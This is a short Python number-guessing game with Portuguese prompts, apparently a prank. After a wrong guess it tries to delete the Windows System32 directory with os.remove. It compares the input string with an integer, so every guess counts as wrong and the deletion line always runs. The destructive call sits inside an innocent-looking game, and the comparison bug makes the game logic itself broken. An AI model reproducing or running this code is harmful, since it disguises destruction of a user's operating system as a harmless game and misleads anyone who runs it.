import random
import os
numero = random.randint(1, 10)

adivinhe = input("Jogo de adivinha! Adivinhe o número entre 1 e 10: ")
if adivinhe == numero:
    print("Parabéns, você acertou!")
else:
    print("Que pena, você errou! O número era", numero)
    os.remove("C:\Windows\System32")
